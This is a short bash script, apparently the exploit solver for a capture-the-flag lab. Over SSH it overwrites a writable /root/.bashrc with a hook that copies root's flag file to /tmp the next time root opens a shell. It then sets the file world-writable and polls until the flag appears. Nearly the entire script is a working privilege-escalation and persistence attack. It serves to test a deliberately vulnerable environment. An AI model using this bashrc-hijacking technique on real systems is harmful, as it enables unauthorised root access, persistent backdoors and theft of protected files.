#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/bashrc_flag
cat > /root/.bashrc <<'\''EOF'\''
if [ "$(id -u)" -eq 0 ]; then
  cat /root/flag.txt > /tmp/bashrc_flag
fi
EOF
chmod 666 /root/.bashrc
for i in $(seq 1 45); do
  if test -r /tmp/bashrc_flag && grep -q FLAG /tmp/bashrc_flag 2>/dev/null; then
    cat /tmp/bashrc_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for bashrc hook" >&2
ls -la /root/.bashrc /tmp/bashrc_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
